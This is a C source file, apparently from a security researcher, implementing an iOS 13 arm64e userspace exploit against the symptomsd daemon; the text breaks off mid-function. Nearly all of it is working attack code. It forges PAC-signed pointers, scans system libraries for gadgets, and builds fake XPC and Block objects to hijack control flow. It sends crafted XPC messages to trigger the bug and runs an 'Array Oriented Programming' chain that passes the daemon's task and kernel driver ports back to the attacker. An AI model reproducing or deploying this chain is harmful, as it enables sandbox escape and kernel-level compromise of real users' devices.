//
//  ios13_userspace_pac.c
//  ios13_app1
//
//  Created by bb on 1/12/20.
//  Copyright © 2020 bb. All rights reserved.
//

#if __arm64e__

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/thread_status.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <pthread/pthread.h>
#include <copyfile.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/time.h>
#include <ptrauth.h> // For PAC-device(arm64e) support
#include "IOKitLib.h"
#include "xpc.h"

extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);

#pragma pack(4)

#define SPRAY_ADDRESS 0x150010000

#define TARGET_MACH_SERVICE "com.apple.usymptomsd"
#define TARGET_MACH_SERVICE_2 "com.apple.symptoms.symptomsd.managed_events"

#define OF(offset) (offset)/sizeof(uint64_t)
#define exit(X) longjmp(jmpb, 1)

jmp_buf jmpb;

uint64_t PACSupport_pacdza(uint64_t data_ptr){
    
    const char *unused_fmt = "";
    printf(unused_fmt, data_ptr);
    __asm__ __volatile__("mov %0, x8"
                         ::"r"(data_ptr));
    __asm__ __volatile__(
                         "pacdza    x8\n"
                         "mov %0, x8\n"
                         :"=r"(data_ptr));
    return data_ptr;
}

uint64_t PACSupport_paciza(uint64_t code_ptr){
    
    const char *unused_fmt = "";
    printf(unused_fmt, code_ptr);
    __asm__ __volatile__("mov %0, x8"
                         ::"r"(code_ptr));
    __asm__ __volatile__(
                         "paciza    x8\n"
                         "mov %0, x8\n"
                         :"=r"(code_ptr));
    return code_ptr;
}

uint64_t PACSupport_pacia(uint64_t code_ptr, uint64_t modifier){
    
    __asm__ __volatile__(
                         "pacia    x0, x1\n"
                         "mov    x18, x0\n"
                         "mov    %0, x18\n"
                         :"=r"(code_ptr));
    return code_ptr;
}

uint64_t PACSupport_xpaci(void *code_ptr){
    return (uint64_t)ptrauth_strip(code_ptr, ptrauth_key_asia);
}

uint64_t PACSupport_addMask(uint64_t data_ptr, uint32_t mask){
    
    /*
     Commonly used in cooperate with "blraa"
     
     0000000190e0db00    ldraa    x9, [x8, #0x10]!
     0000000190e0db04    movk    x8, #0x165d, lsl #48
     0000000190e0db08    blraa    x9, x8
     */
    
    data_ptr |= (((uint64_t)mask) << 48);
    return data_ptr;
}

#pragma mark AOP Gadgets
// AOP: Array Oriented Programming

void *dylibcache_start = NULL;
size_t dylibcache_size = 0;

bool isPartOf_dyldcache(vm_address_t addr){
    vm_size_t size = 0;
    natural_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t info_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    if(vm_region_recurse_64(mach_task_self(), &addr, &size, &depth, (vm_region_info_t)&info, &info_cnt))
        return false;
    if(info.share_mode == SM_TRUESHARED)
        return true;
    return false;
}

size_t Get_loaded_dylib_size(void *dylib_address){
    struct mach_header *mh = (struct mach_header*)dylib_address;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)((char*)mh+sizeof(struct mach_header_64));
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SEGMENT_64:{
                struct segment_command_64 *seg = (struct segment_command_64*)cmd;
                if(!strcmp(seg->segname,"__TEXT")){
                    return seg->vmsize;
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    return 0;
}

void Find_dylibcache(){
    
    vm_address_t minAddr = 0;
    vm_address_t maxAddr = 0;
    
    for (uint32_t i = 0; i < _dyld_image_count(); i++){
        uint64_t addr = (uint64_t)_dyld_get_image_header(i);
        const char *name = _dyld_get_image_name(i);
        if(strncmp(name, "/System/", 8) && strncmp(name, "/usr/", 5))
            continue;
        if(!isPartOf_dyldcache(addr))
            continue;
        if(!minAddr || addr < minAddr)
            minAddr = addr;
        if(addr > maxAddr)
            maxAddr = addr;
    }
    
    if(!minAddr||!maxAddr){
        printf("dylibcache Not Ready!\n");
        exit();
    }
    
    size_t last_dylib_size = Get_loaded_dylib_size((void*)maxAddr);
    
    dylibcache_start = (void*)minAddr;
    dylibcache_size = (size_t)((maxAddr + last_dylib_size) - minAddr);
    
    printf("Dylibcache range: %p - %p\n", dylibcache_start, dylibcache_start + dylibcache_size);
}

uint64_t find_gadget(char *bytes, size_t len){
    void *addr = memmem(dylibcache_start, dylibcache_size, bytes, len);
    if(!addr){
        printf("Gadget didn't find, len:0x%zx\n",len);
    }
    return (uint64_t)addr;
}

uint64_t find_gadget_speed(char *bytes, size_t len, void *findingRange_start, uint64_t findingRange_size){
    void *addr = memmem(findingRange_start, findingRange_size, bytes, len);
    if(!addr){
        //printf("Gadget didn't find, len:0x%zx\n",len);
    }
    return (uint64_t)addr;
}

char _bytes_dualJump_ios12[] = {
    0x08, 0x00, 0x40, 0xF9, // ldr    x8, [x0]
    0x09, 0x3D, 0x20, 0xF8, // ldraa  x9, [x8, #0x18]!
    0x48, 0x15, 0xEE, 0xF2, // movk   x8, #0x70aa, lsl #48
    0x28, 0x09, 0x3F, 0xD7, // blraa  x9, x8
    0x08, 0x00, 0x40, 0xF9, // ldr    x8, [x0]
    0xE8, 0x3B, 0xC1, 0xDA, // autdza x8
    0x09, 0x01, 0x40, 0xF9, // ldr    x9, [x8]
    0xA8, 0x39, 0xFF, 0xF2, // movk   x8, #0xf9cd, lsl #48
    0x28, 0x09, 0x3F, 0xD7, // blraa  x9, x8
};
char _bytes_dualJump_ios13[] = {
    0x08, 0x00, 0x40, 0xF9, // ldr    x8, [x0]
    0x09, 0x3D, 0x20, 0xF8, // ldraa  x9, [x8, #0x18]!
    0x48, 0x92, 0xFA, 0xF2, // movk   x8, #0xd492, lsl #48
    0x28, 0x09, 0x3F, 0xD7, // blraa  x9, x8
    0x08, 0x00, 0x40, 0xF9, // ldr    x8, [x0]
    0x09, 0x0D, 0x20, 0xF8, // ldraa  x9, [x8, #0x0]!
    0xA8, 0x39, 0xFF, 0xF2, // movk   x8, #0xf9cd, lsl #48
    0x28, 0x09, 0x3F, 0xD7, // blraa  x9, x8
};
#define _Gadget_dualJump  find_gadget(_bytes_dualJump_ios13,sizeof(_bytes_dualJump_ios13))
uint64_t Gadget_dualJump = 0;

// ldr x0, [x0] ; xpacd  x0 ; ret
#define _Gadget_strip_x0  find_gadget((char[]){0x00,0x00,0x40,0xF9,0xE0,0x47,0xC1,0xDA,0xC0,0x03,0x5F,0xD6},12)
uint64_t Gadget_strip_x0 = 0;

char _bytes_control_x0x2[] = {
    0xF3, 0x03, 0x00, 0xAA, // mov    x19, x0
    0x08, 0x00, 0x42, 0xA9, // ldp    x8, x0, [x0, #0x20]
    0x61, 0x3A, 0x40, 0xB9, // ldr    w1, [x19, #0x38]
    0x62, 0x1A, 0x40, 0xF9, // ldr    x2, [x19, #0x30]
    0x1F, 0x09, 0x3F, 0xD6, // blraaz x8
};
#define _Gadget_control_x0x2 find_gadget_speed(_bytes_control_x0x2,sizeof(_bytes_control_x0x2),findingRange_start,findingRange_size)
uint64_t Gadget_control_x0x2 = 0;

char _bytes_memcopy[] = {
    0x08, 0x00, 0x40, 0xB9, // ldr    w8, [x0]
    0x68, 0x00, 0x00, 0xB9, // str    w8, [x3]
    0xC0, 0x03, 0x5F, 0xD6, // ret
};
#define _Gadget_memcopy find_gadget_speed(_bytes_memcopy,sizeof(_bytes_memcopy),findingRange_start,findingRange_size)
uint64_t Gadget_memcopy = 0;

#define aop_FuncCALL(FUNC, ARG1, ARG2, ARG3, ARG4) \
spraymem[OF(_aop_FuncCALL_primer_offset)] = spray_start_address + _aop_FuncCALL_offset; \
{char *func_call_payload = ((char*)spraymem) + _aop_FuncCALL_offset; \
_aop_FuncCALL_primer_offset += 8; \
_aop_FuncCALL_offset += 0x74; \
*(uint32_t*)(func_call_payload + 20) = 53; \
*(uint64_t*)(func_call_payload) = 0; \
*(uint32_t*)(func_call_payload + 8) = 0; \
char *tmp_ha = func_call_payload + 24; /* Saved an offset later gonna involves multiple time */ \
*(uint32_t*)(tmp_ha + 4) = 150; \
*(uint32_t*)(func_call_payload + 4) = 116; \
*(uint64_t*)(tmp_ha + 16) = PACSupport_paciza(PACSupport_xpaci(FUNC)); /* func ptr */ \
*(uint64_t*)(tmp_ha + 24) = ARG1; /* arg1 */ \
*(uint32_t*)(tmp_ha + 72) = ARG2; /* arg2 (Only 32bits)*/ \
*(uint64_t*)(tmp_ha + 76) = ARG3; /* arg3 */ \
*(uint64_t*)(tmp_ha + 84) = ARG4;} // arg4

#define aop_FuncCALL_memcpy_32bits(dst, src) \
aop_FuncCALL((void*)Gadget_memcopy, src, 0, 0, dst)

#define aop_Insert_String(VAR, STR) \
size_t _##VAR##_len = strlen(STR) + 1; \
uint64_t VAR = SPRAY_ADDRESS + _aop_data_offset; \
memcpy((char*)spraymem + _aop_data_offset, STR, _##VAR##_len); \
_##VAR##_len = (~0xF) & (_##VAR##_len + 0xF); \
_aop_data_offset += _##VAR##_len;

#define aop_Insert_Data(VAR, DATA, SIZE) \
size_t _##VAR##_SIZE = SIZE; \
uint64_t VAR = SPRAY_ADDRESS + _aop_data_offset; \
memcpy((char*)spraymem + _aop_data_offset, DATA, _##VAR##_SIZE); \
_##VAR##_SIZE = (~0xF) & (_##VAR##_SIZE + 0xF); \
_aop_data_offset += _##VAR##_SIZE;

void Find_aopGadgets(){
    
#define _SEEK(V) if(!(V = _##V)){printf("No "#V" Found!\n");exit();}
    
    //_SEEK(Gadget_dualJump); Unused
    //_SEEK(Gadget_strip_x0); Unused
    //_SEEK(Gadget_control_x0x2); Switch to speed version
    //_SEEK(Gadget_memcopy); Switch to speed version

}

/*void Find_aopGadgets_speed(){
    
    const char *target_lib_1 = "/System/Library/PrivateFrameworks/CoreUtils.framework/CoreUtils";
    const char *target_lib_2 = "/System/Library/PrivateFrameworks/WebCore.framework/Frameworks/libwebrtc.dylib";
    
    dlopen(target_lib_1, RTLD_NOW);
    dlopen(target_lib_2, RTLD_NOW);
    
    for (uint32_t i = 0; i < _dyld_image_count(); i++){
        
        const char *name = _dyld_get_image_name(i);
        if(!strcmp(name, target_lib_1)){
            
            void *findingRange_start = (void*)_dyld_get_image_header(i);
            uint64_t findingRange_size = (uint64_t)Get_loaded_dylib_size(findingRange_start);
            _SEEK(Gadget_control_x0x2);
        }
        else if(!strcmp(name, target_lib_2)){
            
            void *findingRange_start = (void*)_dyld_get_image_header(i);
            uint64_t findingRange_size = (uint64_t)Get_loaded_dylib_size(findingRange_start);
            _SEEK(Gadget_memcopy);
        }
    }
}
*/

 void Find_aopGadgets_speed(){
    
    const char *target_lib_1 = "/System/Library/PrivateFrameworks/CoreUtils.framework/CoreUtils";
    const char *target_lib_2 = "/System/Library/PrivateFrameworks/WebCore.framework/Frameworks/libwebrtc.dylib";
    
    dlopen(target_lib_1, RTLD_NOW);
    dlopen(target_lib_2, RTLD_NOW);
    
    for (uint32_t i = 0; i < _dyld_image_count(); i++){
        
        {
            void *findingRange_start = (void*)_dyld_get_image_header(i);
            uint64_t findingRange_size = (uint64_t)Get_loaded_dylib_size(findingRange_start);
            if(!Gadget_control_x0x2)
                Gadget_control_x0x2 = _Gadget_control_x0x2;
        }
        {
            void *findingRange_start = (void*)_dyld_get_image_header(i);
            uint64_t findingRange_size = (uint64_t)Get_loaded_dylib_size(findingRange_start);
            if(!Gadget_memcopy)
                Gadget_memcopy = _Gadget_memcopy;
        }
    }
    if(!Gadget_control_x0x2){
        printf("Error: Gadget_control_x0x2 not found!\n"); sleep(999);
    }
    if(!Gadget_memcopy){
        printf("Error: Gadget_memcopy not found!\n"); sleep(999);
    }
}

// Look up service: com.apple.usymptomsd
uint8_t bootstrap_look_up_machmsg_bytes[244] = {0x13,0x15,0x13,0x0,0xf4,0x0,0x0,0x0,0x7,0x7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x10,0x43,0x50,0x58,0x40,0x5,0x0,0x0,0x0,0x0,0xf0,0x0,0x0,0xcc,0x0,0x0,0x0,0x8,0x0,0x0,0x0,0x73,0x75,0x62,0x73,0x79,0x73,0x74,0x65,0x6d,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x5,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x68,0x61,0x6e,0x64,0x6c,0x65,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x69,0x6e,0x73,0x74,0x61,0x6e,0x63,0x65,0x0,0x0,0x0,0x0,0x0,0xa0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x72,0x6f,0x75,0x74,0x69,0x6e,0x65,0x0,0x0,0x40,0x0,0x0,0xcf,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x66,0x6c,0x61,0x67,0x73,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x6e,0x61,0x6d,0x65,0x0,0x0,0x0,0x0,0x0,0x90,0x0,0x0,0x15,0x0,0x0,0x0,0x63,0x6f,0x6d,0x2e,0x61,0x70,0x70,0x6c,0x65,0x2e,0x75,0x73,0x79,0x6d,0x70,0x74,0x6f,0x6d,0x73,0x64,0x0,0x0,0x0,0x0,0x74,0x79,0x70,0x65,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x74,0x61,0x72,0x67,0x65,0x74,0x70,0x69,0x64,0x0,0x0,0x0,0x0,0x30,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0};

uint8_t vm_remap_machmsg_bytes[92] = {0x13,0x15,0x0,0x80,0x5c,0x0,0x0,0x0,0x11,0x11,0x11,0x11,0x22,0x22,0x22,0x22,0x0,0x0,0x0,0x0,0xcd,0x12,0x0,0x0,0x1,0x0,0x0,0x0,0x3,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x13,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x33,0x33,0x0,0x0,0x0,0x0,0x0,0x0,0xff,0xf,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x40,0x0,0x0,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0};

void Assemble_AOP(uint64_t *aop_stack, uint64_t rop_start_address){
    
    extern void get_string(char *copyto); // copy a fake string
    get_string(aop_stack);
}

void Assemble_AOP2(uint64_t *spraymem, uint64_t spray_start_address){
    
    // Trigger vuln causing call objc_release with fake_xpcobj
    char *fake_xpcobj = (char*)spraymem;
    *(uint64_t*)fake_xpcobj = (uint64_t)dlsym((void*)-2, "_xpc_type_file_transfer");
    *(uint32_t*)(fake_xpcobj + 0xC) = 0; // set retainCnt as 0, leads to _xpc_file_transfer_dispose
    *(uint64_t*)(fake_xpcobj + 0x40) = spray_start_address + 0x48; // leads to _Block_release during disposal
    
    char *fake_Block = ((char*)spraymem) + 0x48;
    char *fake_Block_core = fake_Block + 0x40;
    
    *(uint32_t*)(fake_Block + 0x8) = 0x3000000 | 0x2; // Necessary bits mask | retainCnt
    *(uint64_t*)(fake_Block + 0x18) = (uint64_t)spray_start_address + 0x48 + 0x40;
    
    // First place got control of PC
    *(uint64_t*)(fake_Block_core + 0x18) = PACSupport_pacia(Gadget_control_x0x2, (uint64_t)spray_start_address + 0x48 + 0x40 + 0x18);
    
    // --- Execute control_x0x2 gadget
    *(uint64_t*)(fake_Block + 0x20) = PACSupport_paciza(PACSupport_xpaci(dlsym((void*)-2, "xpc_array_apply_f"))); // Next jmp
    *(uint64_t*)(fake_Block + 0x28) = spray_start_address + 0x100 - 24; // Reset x0, point to our spray mem, explicitly, a crafted xpc array
    *(uint64_t*)(fake_Block + 0x30) = (uint64_t)IODispatchCalloutFromMessage; // Reset x2
    *(uint64_t*)(fake_Block + 0x38) = 0x0; // Reset w1 (Only 32bit)
    
    /*
     Begin Array-Oriented-Programming function chain-calling
     
     Payload arrangement:
     
     0x0
     ... Used during taking control of PC
     0x100
     ... AOP array object itself
     0x118
     ... For AOP data-use
     0x1500
     ... For AOP call-use
     0x3E00
     ... AOP array storage
     0x4000
     */
    
    uint32_t _aop_FuncCALL_primer_offset = 0x3E00;
    uint32_t _aop_FuncCALL_offset = 0x1800;
    uint32_t _aop_data_offset = 0x118; // offset is right after fake array
    
    // Craft a fake array, stru has changed and req size increased to 0x18 since iOS13, was 0x10
    spraymem[OF(0x100)] = spray_start_address + _aop_FuncCALL_primer_offset; // Array internal pointer, point to stored objects pool
    spraymem[OF(0x108)] = -1; // Array count, -1 causes the array to iterate endlessly  -1
    spraymem[OF(0x110)] = 0; // new value introd since iOS13, keep it empty
    
    // --- Following are AOP data-use
    
    aop_Insert_Data(lookup_io_server_rawmsg, bootstrap_look_up_machmsg_bytes, sizeof(bootstrap_look_up_machmsg_bytes));
    *(uint64_t*)(vm_remap_machmsg_bytes + 56) = 0x4000000; // 0x4000000 //0x30000; // size of iosurface
    aop_Insert_Data(vm_remap_rawmsg, vm_remap_machmsg_bytes, sizeof(vm_remap_machmsg_bytes));
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        // our_recv_port.name: +28
        mach_msg_port_descriptor_t our_task_port;
        // our_task_port.name: +40
        mach_msg_port_descriptor_t IOSurfaceRoot_servport;
        // IOSurfaceRoot_servport.name: +52
        mach_msg_port_descriptor_t AppleAVE2Driver_servport;
        // AppleAVE2Driver_servport.name: +64
        mach_msg_trailer_t trailer;
    }_remote_recvmsg = {0}; // Size: 84
    _remote_recvmsg.Head.msgh_size = sizeof(_remote_recvmsg);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        mach_msg_trailer_t trailer;
    }_remote_recvmsg2 = {0}; // Size: 32
    _remote_recvmsg2.Head.msgh_size = sizeof(_remote_recvmsg2);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        uint64_t remote_map_addr;
        // remote_map_addr: +24
        mach_msg_trailer_t trailer;
    }_remote_recvmsg3 = {0}; // Size: 56
    _remote_recvmsg3.Head.msgh_size = sizeof(_remote_recvmsg3);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_remote_port +8
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port_send_to_us;
        // port_send_to_us.name +28
    }_remote_sendmsg = {0};
    _remote_sendmsg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg.Head.msgh_size = sizeof(_remote_sendmsg);
    _remote_sendmsg.msgh_body.msgh_descriptor_count = 1;
    _remote_sendmsg.port_send_to_us.name = mach_task_self();
    _remote_sendmsg.port_send_to_us.disposition = MACH_MSG_TYPE_MOVE_SEND;
    _remote_sendmsg.port_send_to_us.type = MACH_MSG_PORT_DESCRIPTOR;
    
    struct {
        mach_msg_header_t Head;
    }_remote_sendmsg2 = {0};
    _remote_sendmsg2.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg2.Head.msgh_size = sizeof(_remote_sendmsg2);
    
    struct {
        mach_msg_header_t Head;
        uint64_t send_remap_addr_to_us;
        // send_remap_addr_to_us: +24
    }_remote_sendmsg3 = {0};
    _remote_sendmsg3.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg3.Head.msgh_size = sizeof(_remote_sendmsg3);
    
    aop_Insert_Data(remote_recvmsg, &_remote_recvmsg, sizeof(_remote_recvmsg));
    aop_Insert_Data(remote_recvmsg2, &_remote_recvmsg2, sizeof(_remote_recvmsg2));
    aop_Insert_Data(remote_recvmsg3, &_remote_recvmsg3, sizeof(_remote_recvmsg3));
    aop_Insert_Data(remote_sendmsg, &_remote_sendmsg, sizeof(_remote_sendmsg));
    aop_Insert_Data(remote_sendmsg2, &_remote_sendmsg2, sizeof(_remote_sendmsg2));
    aop_Insert_Data(remote_sendmsg3, &_remote_sendmsg3, sizeof(_remote_sendmsg3));
    
    // --- Following are AOP code-use
    
    // Call bootstrap_look_up to retri listening port
    aop_FuncCALL(mach_port_allocate, mach_task_self(), MACH_PORT_RIGHT_RECEIVE, lookup_io_server_rawmsg + offsetof(mach_msg_header_t, msgh_local_port), 0);
    aop_FuncCALL(mach_msg_send, lookup_io_server_rawmsg, 0, 0, 0);
    aop_FuncCALL(mach_msg_receive, lookup_io_server_rawmsg, 0, 0, 0);
    
    aop_FuncCALL_memcpy_32bits(remote_recvmsg + offsetof(mach_msg_header_t, msgh_local_port), lookup_io_server_rawmsg + 28);
    aop_FuncCALL(mach_msg_receive, remote_recvmsg, 0, 0, 0);
    aop_FuncCALL_memcpy_32bits(remote_recvmsg2+12, remote_recvmsg+12);
    aop_FuncCALL_memcpy_32bits(remote_recvmsg3+12, remote_recvmsg+12);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg+8, remote_recvmsg+28);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg2+8, remote_recvmsg+28);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg3+8, remote_recvmsg+28);
    
    aop_FuncCALL_memcpy_32bits(vm_remap_rawmsg+8, remote_recvmsg+40);
    aop_FuncCALL(mach_port_allocate, mach_task_self(), MACH_PORT_RIGHT_RECEIVE, vm_remap_rawmsg + offsetof(mach_msg_header_t, msgh_local_port), 0);
    
    aop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0); // To inform us that pwned proc got the msg contains our port
    
    // Then passing own task port to us
    aop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0);
    /*
     Reason of doing this, instead like in iOS12 exploit, open IO service port via IOServiceOpen and passing to us directly.
     iOS 13 added new mitigation prevent all IOUserClient (obtain via IOServiceOpen) port from moving to other ipc space, namely diff tasks.
     
     I supposed these port are marked as guarded port.
     
     Example crash:
     Exception Type:  EXC_GUARD
     Exception Subtype: GUARD_TYPE_MACH_PORT
     Exception Message:  on mach port 84999 (guarded with 0x0000000000000000)
     Exception Note:  SIMULATED (this is NOT a crash)
     
     Way to get around this is "passively" passing to us, like use task_get_special_port/task_set_special_port trick
     */
    
    // Opening and passing kernel driver ports to us.
    aop_FuncCALL_memcpy_32bits(spray_start_address + _aop_FuncCALL_offset + 24 + 24, remote_recvmsg+52);
    aop_FuncCALL(dlsym((void*)-2, "IOServiceOpen"), 0x414141, mach_task_self(), 0, spray_start_address + _aop_FuncCALL_offset + 24 + 76);
    
    aop_FuncCALL(task_set_special_port, mach_task_self(), TASK_SEATBELT_PORT, 0x414141, 0);
    aop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0);
    aop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0); // Waiting for us to notify pwned proc we got the port
    
    aop_FuncCALL_memcpy_32bits(SPRAY_ADDRESS + _aop_FuncCALL_offset + 24 + 24, remote_recvmsg+64);
    aop_FuncCALL(dlsym((void*)-2, "IOServiceOpen"), 0x414141, mach_task_self(), 0, spray_start_address + _aop_FuncCALL_offset + 24 + 76);
    
    aop_FuncCALL(task_set_special_port, mach_task_self(), TASK_ACCESS_PORT, 0x414141, 0);
    aop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0);
    
    // Waiting for overwriting over the iosurface mapping memory, key to trigger vulnerability in kernel
    aop_FuncCALL(mach_msg_receive, remote_recvmsg3, 0, 0, 0);
    
    // Perform cross-task memory mapping
    aop_FuncCALL_memcpy_32bits(vm_remap_rawmsg+76, remote_recvmsg3+24);
    aop_FuncCALL_memcpy_32bits(vm_remap_rawmsg+80, remote_recvmsg3+28); // src addr which is the remote mapping addr
    aop_FuncCALL(mach_msg_send, vm_remap_rawmsg, 0, 0, 0);
    aop_FuncCALL(mach_msg_receive, vm_remap_rawmsg, 0, 0, 0);
    
    // send remap addr to us
    aop_FuncCALL_memcpy_32bits(remote_sendmsg3+24, vm_remap_rawmsg+36);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg3+28, vm_remap_rawmsg+40); // src addr which is the remote mapping addr
    aop_FuncCALL(mach_msg_send, remote_sendmsg3, 0, 0, 0);
    
    // Block here to waiting for finish exploitation
    aop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0);
    
    // Duty completed
    aop_FuncCALL(exit, 0, 0, 0, 0);
    
    //printf("_aop_data_offset: 0x%x\n", _aop_data_offset);
    //printf("_aop_FuncCALL_offset: 0x%x\n", _aop_FuncCALL_offset);
    //printf("_aop_FuncCALL_primer_offset: 0x%x\n", _aop_FuncCALL_primer_offset);
}

void symptomsd_vuln_prepare1(){
    
    xpc_connection_t xpcconn = xpc_connection_create_mach_service("com.apple.symptoms.symptomsd.managed_events", NULL, 0);
    xpc_connection_set_event_handler(xpcconn, ^(xpc_object_t object) {
    });
    xpc_connection_resume(xpcconn);
    
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64(msg, "type", 2); // case 2: read_and_set_config, case 3: read_config
    
    xpc_object_t config_arr = xpc_array_create(NULL, 0);
    xpc_dictionary_set_value(msg, "config", config_arr);
    
    xpc_object_t each_config = xpc_dictionary_create(NULL, NULL, 0);
    // Parse by -[ConfigurationHandler read:returnedValues:]
    xpc_array_append_value(config_arr, each_config);
    
    xpc_dictionary_set_string(each_config, "GENERIC_CONFIG_TARGET", "com.apple.symptoms.test.request-passthrough"); // [knownItems objectForKey: ???]
    
    xpc_object_t signature_arr = xpc_array_create(NULL, 0);
    xpc_dictionary_set_value(each_config, "TRIGGERED_SIGNATURES", signature_arr); // Enter -[SimpleSymptomEvaluator configureInstance:]
    
    xpc_object_t each_signature = xpc_dictionary_create(NULL, NULL, 0);
    xpc_array_append_value(signature_arr, each_signature);
    
    xpc_dictionary_set_string(each_signature, "SIGNATURE_NAME", "HAHA");
    
    xpc_dictionary_set_string(each_signature, "ADDITIONAL_INFO_GENERATOR", "CertificateErrors"); //CertificateErrors
    xpc_dictionary_set_string(each_signature, "ADDITIONAL_INFO_SELECTOR", "conditionMinCount"); //additionalSelector
    
    xpc_dictionary_set_string(each_signature, "SYNDROME_NAME", "new_HAHA2");  // must set
    xpc_dictionary_set_int64(each_signature, "RULE_AWD_CODE", 7);
    
    // -[SimpleSyndromeHandler configureInstance:]
    xpc_dictionary_set_int64(each_signature, "SYNDROME_DAMPENING_INTERVAL", 0); // SimpleSyndromeHandler->_dampeningInterval
    xpc_dictionary_set_string(each_signature, "SYNDROME_HANDLER", "ManagedEventHandler"); // ??? getHandlerByName:
    
    
    xpc_connection_send_message_with_reply(xpcconn, msg, dispatch_get_main_queue(), ^(xpc_object_t object) {
    });
}

void symptomsd_vuln_prepare2(int boo){
    
    xpc_connection_t xpcconn = xpc_connection_create_mach_service("com.apple.symptoms.symptomsd.managed_events", NULL, 0);
    xpc_connection_set_event_handler(xpcconn, ^(xpc_object_t object) {
    });
    xpc_connection_resume(xpcconn);
    
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64(msg, "type", 2); // case 2/3
    
    xpc_object_t config_arr = xpc_array_create(NULL, 0);
    xpc_dictionary_set_value(msg, "config", config_arr);
    
    xpc_object_t each_config = xpc_dictionary_create(NULL, NULL, 0); // Parse by -[ConfigurationHandler read:returnedValues:]
    xpc_array_append_value(config_arr, each_config);
    
    xpc_dictionary_set_string(each_config, "GENERIC_CONFIG_TARGET", "CertificateErrors"); // [knownItems objectForKey: CertificateErrors]
    
    if(boo){
        xpc_dictionary_set_string(each_config, "REQUIRED_MINIMUM_COUNT", "5637210112"); // Turn SPRAY_ADDRESS to Decimal
    }
    else{
        xpc_dictionary_set_string(each_config, "REQUIRED_MINIMUM_COUNT", "0"); // 0x150010110 (5637210384) | crash: 22817079568
    }

    xpc_connection_send_message_with_reply(xpcconn, msg, dispatch_get_main_queue(), ^(xpc_object_t object) {
    });
}

void symptomsd_vuln_trigger(int boo){
    
    xpc_connection_t xpcconn = xpc_connection_create_mach_service("com.apple.usymptomsd", NULL, 0);
    xpc_connection_set_event_handler(xpcconn, ^(xpc_object_t object) {
        //printf("replyA\n");
        //char *err = xpc_dictionary_get_string(object, XPC_ERROR_KEY_DESCRIPTION);
        //printf("erra: %s\n", err);
    });
    xpc_connection_resume(xpcconn);
    
    size_t payload_size = 8 + 72 + 100 + 6; // payload head + 1st tlv length + 1st tlv body + beginning of 2nd tlv (To break the loop)
    char *payload = malloc(payload_size);
    bzero(payload, payload_size);
    
    *(uint16_t*)payload = 2; // case ? for switch statement
    *(uint16_t*)(payload + 2) = 72; // len for SYMTLV_SYM_BASIC
    *(uint8_t*)(payload + 11) = 0x40; // Do not let it passes: if ( !(*(_BYTE *)(payload + 11) & 0x40) )
    *(uint16_t*)(payload + 72 + 4) = 8; // Do not let it passes: if ( *(_WORD *)(payload_ing_inner + *(uint16_t*)(payload + 2) + 4) != 8 )
    
    char *payload_inner = payload + 72 + 4;
    
